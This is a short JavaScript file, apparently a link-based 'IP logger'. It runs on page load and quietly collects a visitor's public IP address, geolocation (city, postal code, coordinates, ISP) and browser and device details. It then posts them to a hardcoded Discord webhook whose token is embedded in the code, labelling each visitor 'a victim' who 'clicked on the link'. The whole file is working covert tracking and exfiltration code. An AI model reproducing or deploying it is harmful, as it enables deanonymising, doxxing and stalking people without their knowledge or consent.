const sendIP = () => {
    // Fetch the public IP address
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            
            // Fetch geolocation data based on the IP
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {
                    
                    // Gather device information
                    const deviceInfo = {
                        userAgent: navigator.userAgent,            // Browser and OS info
                        screenWidth: window.screen.width,          // Screen width
                        screenHeight: window.screen.height,        // Screen height
                        deviceMemory: navigator.deviceMemory || "N/A", // Available memory
                        language: navigator.language,              // Language of the browser
                        platform: navigator.platform               // Platform (Windows, macOS, etc.)
                    };
                    
                    // Discord Webhook URL
                    const dscURL = 'https://discord.com/api/webhooks/1407630270030680114/24KgIRJu3KCrhK_ELjkh70k8pyu18Xqz9LQGTa4O53cdtLCXZXoW67cM_5mPToQVlvkZ';
                    
                    // Send data to Discord Webhook
                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: "SCRIPTY IP LOGGER",
                            avatar_url: "https://media.discordapp.net/attachments/1378331466102083756/1407630039213932625/Snimka_obrazovky_2025-08-16_180821.png",
                            content: `@here another bozo clicked`,
                            embeds: [
                                {
                                    title: 'A victim clicked on the link!',
                                    description: `
                                        **IP Address >> **${ipadd}
                                        \n**Network >> ** ${geoData.network}
                                        \n**City >> ** ${geoData.city}
                                        \n**Region >> ** ${geoData.region}
                                        \n**Country >> ** ${geoData.country_name}
                                        \n**Postal Code >> ** ${geoData.postal}
                                        \n**Latitude >> ** ${geoData.latitude}
                                        \n**Longitude >> ** ${geoData.longitude}
                                        \n**Timezone >> ** ${geoData.timezone}
                                        \n**ASN >> ** ${geoData.asn}
                                        \n**Organization >> ** ${geoData.org}
                                        \n\n**Device Info:** 
                                        \n**User-Agent >> ** ${deviceInfo.userAgent}
                                        \n**Screen Width >> ** ${deviceInfo.screenWidth}px
                                        \n**Screen Height >> ** ${deviceInfo.screenHeight}px
                                        \n**Device Memory >> ** ${deviceInfo.deviceMemory} GB
                                        \n**Language >> ** ${deviceInfo.language}
                                        \n**Platform >> ** ${deviceInfo.platform}`,
                                    color: 0x800080
                                }
                            ]
                        })
                    });
                });
        })
        .then(dscResponse => {
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};

sendIP();
